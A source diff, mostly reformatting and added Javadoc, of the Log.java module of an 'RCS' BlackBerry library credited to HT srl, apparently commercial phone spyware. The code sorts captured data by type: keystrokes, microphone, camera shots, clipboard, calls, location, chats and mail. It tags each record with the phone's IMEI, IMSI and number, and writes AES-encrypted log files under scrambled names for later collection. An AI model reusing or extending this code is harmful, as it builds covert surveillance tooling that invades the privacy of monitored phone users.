@@ -1,8 +1,8 @@
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
- * Project      : RCS, RCSBlackBerry_lib 
- * File         : Log.java 
+ * Project      : RCS, RCSBlackBerry_lib
+ * File         : Log.java
  * Created      : 26-mar-2010
  * *************************************************/
 package blackberry.log;
@@ -27,6 +27,7 @@ import blackberry.utils.DebugLevel;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
+// TODO: Auto-generated Javadoc
 /*  LOG FORMAT
  *
  *  -- Naming Convention
@@ -57,328 +58,401 @@ import blackberry.utils.WChar;
  *  Un log puo' essere composto sia da un unico blocco DWORD-Dati che da piu' blocchi DWORD-Dati.
  *
  */
-public class Log {
-	private static final int LOG_VERSION_01 = 2008121901;
-	/*
-	 * Tipi di log (quelli SOLO per mobile DEVONO partire da 0xAA00
-	 */
+/**
+ * The Class Log.
+ */
+public final class Log {
+    private static final int LOG_VERSION_01 = 2008121901;
+    /*
+     * Tipi di log (quelli SOLO per mobile DEVONO partire da 0xAA00
+     */
 
-	public static final int LOG_MAGIC_CALLTYPE = 0x0026;
+    public static final int LOG_MAGIC_CALLTYPE = 0x0026;
 
-	public static final int[] TYPE_LOG = new int[] { LogType.UNKNOWN,
-			LogType.MAIL_RAW, LogType.TASK,
-			LogType.CALLLIST, // 0..3
-			LogType.DEVICE, LogType.LOCATION, LogType.CALL,
-			LogType.CALL_MOBILE, // 4..7
-			LogType.KEYLOG, LogType.SNAPSHOT, LogType.URL, LogType.CHAT, // 8..b
-			LogType.MAIL, LogType.MIC, LogType.CAMSHOT, LogType.CLIPBOARD, // c..f
-			LogType.UNKNOWN, LogType.APPLICATION // 10..11
-	};
+    public static final int[] TYPE_LOG = new int[] { LogType.UNKNOWN,
+            LogType.MAIL_RAW, LogType.TASK,
+            LogType.CALLLIST, // 0..3
+            LogType.DEVICE, LogType.LOCATION, LogType.CALL,
+            LogType.CALL_MOBILE, // 4..7
+            LogType.KEYLOG, LogType.SNAPSHOT, LogType.URL, LogType.CHAT, // 8..b
+            LogType.MAIL, LogType.MIC, LogType.CAMSHOT, LogType.CLIPBOARD, // c..f
+            LogType.UNKNOWN, LogType.APPLICATION // 10..11
+    };
 
-	// #debug
-	private static Debug debug = new Debug("Log", DebugLevel.NOTIFY);
+    // #debug
+    private static Debug debug = new Debug("Log", DebugLevel.NOTIFY);
 
-	public static int convertTypeLog(final int agentId) {
-		final int agentPos = agentId - Agent.AGENT;
-		// #ifdef DBC
-		Check.requires(TYPE_LOG != null, "Null TypeLog");
-		// #endif
-		if (agentPos > 0 && agentPos < TYPE_LOG.length) {
-			final int typeLog = TYPE_LOG[agentPos];
-			return typeLog;
-		}
+    /**
+     * Convert type log.
+     * 
+     * @param agentId
+     *            the agent id
+     * @return the int
+     */
+    public static int convertTypeLog(final int agentId) {
+        final int agentPos = agentId - Agent.AGENT;
+        // #ifdef DBC
+        Check.requires(TYPE_LOG != null, "Null TypeLog");
+        // #endif
+        if (agentPos > 0 && agentPos < TYPE_LOG.length) {
+            final int typeLog = TYPE_LOG[agentPos];
+            return typeLog;
+        }
 
-		// #debug
-		debug.warn("Wrong agentId conversion: " + agentId);
-		return LogType.UNKNOWN;
-	}
+        // #debug
+        debug.warn("Wrong agentId conversion: " + agentId);
+        return LogType.UNKNOWN;
+    }
 
-	Date timestamp;
-	String logName;
+    Date timestamp;
+    String logName;
 
-	int logType;
+    int logType;
 
-	String fileName;
-	FileConnection fconn = null;
+    String fileName;
+    FileConnection fconn = null;
 
-	DataOutputStream os = null;
-	Encryption encryption;
-	LogCollector logCollector;
+    DataOutputStream os = null;
+    Encryption encryption;
+    LogCollector logCollector;
 
-	LogDescription logDescription;
-	Device device;
+    LogDescription logDescription;
+    Device device;
 
-	Agent agent;
+    Agent agent;
 
-	int progressive;
+    int progressive;
 
-	private Log() {
-		logCollector = LogCollector.getInstance();
-		device = Device.getInstance();
-		encryption = new Encryption();
-		progressive = -1;
-		// timestamp = new Date();
-	}
+    private Log() {
+        logCollector = LogCollector.getInstance();
+        device = Device.getInstance();
+        encryption = new Encryption();
+        progressive = -1;
+        // timestamp = new Date();
+    }
 
-	public Log(final Agent agent_, final byte[] aesKey) {
-		this();
+    /**
+     * Instantiates a new log.
+     * 
+     * @param agent_
+     *            the agent_
+     * @param aesKey
+     *            the aes key
+     */
+    public Log(final Agent agent_, final byte[] aesKey) {
+        this();
 
-		this.agent = agent_;
+        agent = agent_;
 
-		encryption.makeKey(aesKey);
-	}
+        encryption.makeKey(aesKey);
+    }
 
-	public Log(final Agent agent_, final String aesKey) {
-		this();
+    /**
+     * Instantiates a new log.
+     * 
+     * @param agent_
+     *            the agent_
+     * @param aesKey
+     *            the aes key
+     */
+    public Log(final Agent agent_, final String aesKey) {
+        this();
 
-		this.agent = agent_;
+        agent = agent_;
 
-		final byte[] key = new byte[16];
-		Utils.copy(key, 0, aesKey.getBytes(), 0, 16);
+        final byte[] key = new byte[16];
+        Utils.copy(key, 0, aesKey.getBytes(), 0, 16);
 
-		encryption.makeKey(key);
-	}
+        encryption.makeKey(key);
+    }
 
-	/**
-	 * Chiude il file di log. Torna TRUE se il file e' stato chiuso con
-	 * successo, FALSE altrimenti. Se bRemove e' impostato a TRUE il file viene
-	 * anche cancellato da disco e rimosso dalla coda. Questa funzione NON va
-	 * chiamata per i markup perche' la WriteMarkup() e la ReadMarkup() chiudono
-	 * automaticamente l'handle.
-	 */
-	public boolean close() {
-		boolean ret = true;
+    /**
+     * Chiude il file di log. Torna TRUE se il file e' stato chiuso con
+     * successo, FALSE altrimenti. Se bRemove e' impostato a TRUE il file viene
+     * anche cancellato da disco e rimosso dalla coda. Questa funzione NON va
+     * chiamata per i markup perche' la WriteMarkup() e la ReadMarkup() chiudono
+     * automaticamente l'handle.
+     * 
+     * @return true, if successful
+     */
+    public boolean close() {
+        boolean ret = true;
 
-		if (os != null) {
-			try {
-				os.close();
-			} catch (final IOException e) {
-				ret = false;
-			}
-		}
+        if (os != null) {
+            try {
+                os.close();
+            } catch (final IOException e) {
+                ret = false;
+            }
+        }
 
-		if (fconn != null) {
-			try {
-				fconn.close();
-			} catch (final IOException e) {
-				ret = false;
-			}
-		}
+        if (fconn != null) {
+            try {
+                fconn.close();
+            } catch (final IOException e) {
+                ret = false;
+            }
+        }
 
-		return ret;
-	}
+        return ret;
+    }
 
-	/**
-	 * Questa funzione crea un file di log e lascia l'handle aperto. Il file
-	 * viene creato con un nome casuale, la chiamata scrive l'header nel file e
-	 * poi i dati addizionali se ce ne sono. LogType e' il tipo di log che
-	 * stiamo scrivendo, pAdditionalData e' un puntatore agli eventuali
-	 * additional data e uAdditionalLen e la lunghezza dei dati addizionali da
-	 * scrivere nell'header. Il parametro facoltativo bStoreToMMC se settato a
-	 * TRUE fa in modo che il log venga salvato nella prima MMC disponibile, se
-	 * non c'e' la chiama fallisce. La funzione torna TRUE se va a buon fine,
-	 * FALSE altrimenti.
-	 */
-	public boolean createLog(final byte[] additionalData) {
-		timestamp = new Date();
+    /**
+     * Questa funzione crea un file di log e lascia l'handle aperto. Il file
+     * viene creato con un nome casuale, la chiamata scrive l'header nel file e
+     * poi i dati addizionali se ce ne sono. LogType e' il tipo di log che
+     * stiamo scrivendo, pAdditionalData e' un puntatore agli eventuali
+     * additional data e uAdditionalLen e la lunghezza dei dati addizionali da
+     * scrivere nell'header. Il parametro facoltativo bStoreToMMC se settato a
+     * TRUE fa in modo che il log venga salvato nella prima MMC disponibile, se
+     * non c'e' la chiama fallisce. La funzione torna TRUE se va a buon fine,
+     * FALSE altrimenti.
+     * 
+     * @param additionalData
+     *            the additional data
+     * @return true, if successful
+     */
+    public boolean createLog(final byte[] additionalData) {
+        timestamp = new Date();
 
-		int additionalLen = 0;
+        int additionalLen = 0;
 
-		if (additionalData != null) {
-			additionalLen = additionalData.length;
-		}
+        if (additionalData != null) {
+            additionalLen = additionalData.length;
+        }
 
-		final Vector tuple = logCollector.makeNewName(this, agent);
-		// #ifdef DBC
-		Check.asserts(tuple.size() == 5, "Wrong tuple size");
-		// #endif
+        final Vector tuple = logCollector.makeNewName(this, agent);
+        // #ifdef DBC
+        Check.asserts(tuple.size() == 5, "Wrong tuple size");
+        // #endif
 
-		this.progressive = ((Integer) tuple.elementAt(0)).intValue();
-		final String basePath = (String) tuple.elementAt(1);
-		final String blockDir = (String) tuple.elementAt(2);
-		final String encName = (String) tuple.elementAt(3);
-		final String plainFileName = (String) tuple.elementAt(4);
+        progressive = ((Integer) tuple.elementAt(0)).intValue();
+        final String basePath = (String) tuple.elementAt(1);
+        final String blockDir = (String) tuple.elementAt(2);
+        final String encName = (String) tuple.elementAt(3);
+        final String plainFileName = (String) tuple.elementAt(4);
 
-		final String dir = basePath + blockDir + "/";
-		Path.createDirectory(dir);
+        final String dir = basePath + blockDir + "/";
+        Path.createDirectory(dir);
 
-		fileName = dir + encName;
-		// #ifdef DBC
-		Check.asserts(fileName != null, "null fileName");
-		// #endif
+        fileName = dir + encName;
+        // #ifdef DBC
+        Check.asserts(fileName != null, "null fileName");
+        // #endif
 
-		try {
-			fconn = (FileConnection) Connector.open(fileName);
+        try {
+            fconn = (FileConnection) Connector.open(fileName);
 
-			if (fconn.exists()) {
-				// #debug
-				debug.fatal("It should not exist:" + fileName);
-				return false;
-			}
+            if (fconn.exists()) {
+                // #debug
+                debug.fatal("It should not exist:" + fileName);
+                return false;
+            }
 
-			// #debug info
-	debug.info("Created :" + plainFileName);
+            // #debug info
+            debug.info("Created :" + plainFileName);
 
-			final byte[] plainBuffer = makeDescription(additionalData);
-			// #ifdef DBC
-			Check.asserts(plainBuffer.length >= 32 + additionalLen,
-					"Short plainBuffer");
-			// #endif
+            final byte[] plainBuffer = makeDescription(additionalData);
+            // #ifdef DBC
+            Check.asserts(plainBuffer.length >= 32 + additionalLen,
+                    "Short plainBuffer");
+            // #endif
 
-			fconn.create();
-			os = fconn.openDataOutputStream();
+            fconn.create();
+            os = fconn.openDataOutputStream();
 
-			final byte[] encBuffer = encryption.encryptData(plainBuffer);
-			// #ifdef DBC
-			Check.asserts(encBuffer.length == Encryption
-					.getNextMultiple(plainBuffer.length), "Wrong encBuffer");
-			// #endif
+            final byte[] encBuffer = encryption.encryptData(plainBuffer);
+            // #ifdef DBC
+            Check.asserts(encBuffer.length == Encryption
+                    .getNextMultiple(plainBuffer.length), "Wrong encBuffer");
+            // #endif
 
-			// scriviamo la dimensione dell'header paddato
-			os.write(Utils.intToByteArray(plainBuffer.length));
-			// scrittura dell'header cifrato
-			os.write(encBuffer);
-			os.flush();
+            // scriviamo la dimensione dell'header paddato
+            os.write(Utils.intToByteArray(plainBuffer.length));
+            // scrittura dell'header cifrato
+            os.write(encBuffer);
+            os.flush();
 
-			// #ifdef DBC
-			Check.asserts(fconn.fileSize() == encBuffer.length + 4,
-					"Wrong filesize");
-			// #endif
+            // #ifdef DBC
+            Check.asserts(fconn.fileSize() == encBuffer.length + 4,
+                    "Wrong filesize");
+            // #endif
 
-			// #debug debug
-	debug.trace("plainBuffer.length: " + plainBuffer.length);
-			// #debug debug
-	debug.trace("encBuffer.length: " + encBuffer.length);
+            // #debug debug
+            debug.trace("plainBuffer.length: " + plainBuffer.length);
+            // #debug debug
+            debug.trace("encBuffer.length: " + encBuffer.length);
 
-		} catch (final IOException ex) {
-			// #debug
-			debug.error("file: " + plainFileName + " ex:" + ex);
-			return false;
-		}
+        } catch (final IOException ex) {
+            // #debug
+            debug.error("file: " + plainFileName + " ex:" + ex);
+            return false;
+        }
 
-		return true;
-	}
+        return true;
+    }
 
-	// pubblico solo per fare i test
-	public byte[] makeDescription(final byte[] additionalData) {
+    // pubblico solo per fare i test
+    /**
+     * Make description.
+     * 
+     * @param additionalData
+     *            the additional data
+     * @return the byte[]
+     */
+    public byte[] makeDescription(final byte[] additionalData) {
 
-		if (timestamp == null) {
-			timestamp = new Date();
-		}
+        if (timestamp == null) {
+            timestamp = new Date();
+        }
 
-		int additionalLen = 0;
+        int additionalLen = 0;
 
-		if (additionalData != null) {
-			additionalLen = additionalData.length;
-		}
+        if (additionalData != null) {
+            additionalLen = additionalData.length;
+        }
 
-		final DateTime datetime = new DateTime(timestamp);
+        final DateTime datetime = new DateTime(timestamp);
 
-		logDescription = new LogDescription();
-		logDescription.version = LOG_VERSION_01;
-		logDescription.logType = convertTypeLog(agent.agentId);
-		logDescription.hTimeStamp = datetime.hiDateTime();
-		logDescription.lTimeStamp = datetime.lowDateTime();
-		logDescription.additionalData = additionalLen;
-		logDescription.deviceIdLen = device.getWImei().length;
-		logDescription.userIdLen = device.getWImsi().length;
-		logDescription.sourceIdLen = device.getWPhoneNumber().length;
+        logDescription = new LogDescription();
+        logDescription.version = LOG_VERSION_01;
+        logDescription.logType = convertTypeLog(agent.agentId);
+        logDescription.hTimeStamp = datetime.hiDateTime();
+        logDescription.lTimeStamp = datetime.lowDateTime();
+        logDescription.additionalData = additionalLen;
+        logDescription.deviceIdLen = device.getWImei().length;
+        logDescription.userIdLen = device.getWImsi().length;
+        logDescription.sourceIdLen = device.getWPhoneNumber().length;
 
-		final byte[] baseHeader = logDescription.getBytes();
-		// #ifdef DBC
-		Check.asserts(baseHeader.length == logDescription.length,
-				"Wrong log len");
-		// #endif
+        final byte[] baseHeader = logDescription.getBytes();
+        // #ifdef DBC
+        Check.asserts(baseHeader.length == logDescription.length,
+                "Wrong log len");
+        // #endif
 
-		final int headerLen = baseHeader.length + logDescription.additionalData
-				+ logDescription.deviceIdLen + logDescription.userIdLen
-				+ logDescription.sourceIdLen;
-		final byte[] plainBuffer = new byte[Encryption
-				.getNextMultiple(headerLen)];
+        final int headerLen = baseHeader.length + logDescription.additionalData
+                + logDescription.deviceIdLen + logDescription.userIdLen
+                + logDescription.sourceIdLen;
+        final byte[] plainBuffer = new byte[Encryption
+                .getNextMultiple(headerLen)];
 
-		final DataBuffer databuffer = new DataBuffer(plainBuffer, 0,
-				plainBuffer.length, false);
-		databuffer.write(baseHeader);
-		databuffer.write(device.getWImei());
-		databuffer.write(device.getWImsi());
-		databuffer.write(device.getWPhoneNumber());
+        final DataBuffer databuffer = new DataBuffer(plainBuffer, 0,
+                plainBuffer.length, false);
+        databuffer.write(baseHeader);
+        databuffer.write(device.getWImei());
+        databuffer.write(device.getWImsi());
+        databuffer.write(device.getWPhoneNumber());
 
-		if (additionalLen > 0) {
-			databuffer.write(additionalData);
-		}
+        if (additionalLen > 0) {
+            databuffer.write(additionalData);
+        }
 
-		return plainBuffer;
-	}
+        return plainBuffer;
+    }
 
-	/**
-	 * Override della funzione precedente: invece di generare il nome da una
-	 * stringa lo genera da un numero. Se la chiamata fallisce la funzione torna
-	 * una stringa vuota.
-	 */
-	String makeName(final int agentId, final boolean addPath) {
-		return null;
-	}
+    /**
+     * Override della funzione precedente: invece di generare il nome da una
+     * stringa lo genera da un numero. Se la chiamata fallisce la funzione torna
+     * una stringa vuota.
+     * 
+     * @param agentId
+     *            the agent id
+     * @param addPath
+     *            the add path
+     * @return the string
+     */
+    String makeName(final int agentId, final boolean addPath) {
+        return null;
+    }
 
-	/**
-	 * Genera un nome gia' scramblato per un file log, se bAddPath e' TRUE il
-	 * nome ritornato e' completo del path da utilizzare altrimenti viene
-	 * ritornato soltanto il nome. Se la chiamata fallisce la funzione torna una
-	 * stringa vuota. Il nome generato non indica necessariamente un file che
-	 * gia' non esiste sul filesystem, e' compito del chiamante verificare che
-	 * tale file non sia gia' presente. Se il parametro facoltativo bStoreToMMC
-	 * e' impostato a TRUE viene generato un nome che punta alla prima MMC
-	 * disponibile, se esiste.
-	 */
-	String makeName(final String name, final boolean addPath,
-			final boolean storeToMMC) {
-		return null;
-	}
+    /**
+     * Genera un nome gia' scramblato per un file log, se bAddPath e' TRUE il
+     * nome ritornato e' completo del path da utilizzare altrimenti viene
+     * ritornato soltanto il nome. Se la chiamata fallisce la funzione torna una
+     * stringa vuota. Il nome generato non indica necessariamente un file che
+     * gia' non esiste sul filesystem, e' compito del chiamante verificare che
+     * tale file non sia gia' presente. Se il parametro facoltativo bStoreToMMC
+     * e' impostato a TRUE viene generato un nome che punta alla prima MMC
+     * disponibile, se esiste.
+     * 
+     * @param name
+     *            the name
+     * @param addPath
+     *            the add path
+     * @param storeToMMC
+     *            the store to mmc
+     * @return the string
+     */
+    String makeName(final String name, final boolean addPath,
+            final boolean storeToMMC) {
+        return null;
+    }
 
-	/**
-	 * Questa funzione prende i byte puntati da pByte, li cifra e li scrive nel
-	 * file di log creato con CreateLog(). La funzione torna TRUE se va a buon
-	 * fine, FALSE altrimenti.
-	 */
-	public boolean writeLog(final byte[] data) {
-		if (os == null || fconn == null) {
-			// #debug
-			debug.error("fconn or os null");
-			return false;
-		}
+    /**
+     * Questa funzione prende i byte puntati da pByte, li cifra e li scrive nel
+     * file di log creato con CreateLog(). La funzione torna TRUE se va a buon
+     * fine, FALSE altrimenti.
+     * 
+     * @param data
+     *            the data
+     * @return true, if successful
+     */
+    public boolean writeLog(final byte[] data) {
+        if (os == null || fconn == null) {
+            // #debug
+            debug.error("fconn or os null");
+            return false;
+        }
 
-		final byte[] encData = encryption.encryptData(data);
+        final byte[] encData = encryption.encryptData(data);
 
-		try {
-			os.write(Utils.intToByteArray(data.length));
-			os.write(encData);
-			os.flush();
-		} catch (final IOException e) {
-			return false;
-		}
+        try {
+            os.write(Utils.intToByteArray(data.length));
+            os.write(encData);
+            os.flush();
+        } catch (final IOException e) {
+            return false;
+        }
 
-		return true;
-	}
+        return true;
+    }
 
-	public boolean writeLog(final String data, final boolean endzero) {
-		return writeLog(WChar.getBytes(data, endzero));
-	}
-	
-	public boolean writeLogs(Vector bytelist) {
-		int totalLen = 0;
-		for(int i = 0; i<bytelist.size(); i++ ){
-			byte[] token = (byte[])bytelist.elementAt(i);
-			totalLen += token.length;
-		}
+    /**
+     * Write log.
+     * 
+     * @param data
+     *            the data
+     * @param endzero
+     *            the endzero
+     * @return true, if successful
+     */
+    public boolean writeLog(final String data, final boolean endzero) {
+        return writeLog(WChar.getBytes(data, endzero));
+    }
 
-		int offset = 0;
-		byte[] buffer = new byte[totalLen];
-		DataBuffer databuffer = new DataBuffer(buffer,0,totalLen,false);
-		
-		for(int i = 0; i<bytelist.size(); i++ ){
-			byte[] token = (byte[])bytelist.elementAt(i);
-			databuffer.write(token);
-		}
-		
-		return writeLog(buffer);
-	}
+    /**
+     * Write logs.
+     * 
+     * @param bytelist
+     *            the bytelist
+     * @return true, if successful
+     */
+    public boolean writeLogs(final Vector bytelist) {
+        int totalLen = 0;
+        for (int i = 0; i < bytelist.size(); i++) {
+            final byte[] token = (byte[]) bytelist.elementAt(i);
+            totalLen += token.length;
+        }
+
+        final int offset = 0;
+        final byte[] buffer = new byte[totalLen];
+        final DataBuffer databuffer = new DataBuffer(buffer, 0, totalLen, false);
+
+        for (int i = 0; i < bytelist.size(); i++) {
+            final byte[] token = (byte[]) bytelist.elementAt(i);
+            databuffer.write(token);
+        }
+
+        return writeLog(buffer);
+    }
 }
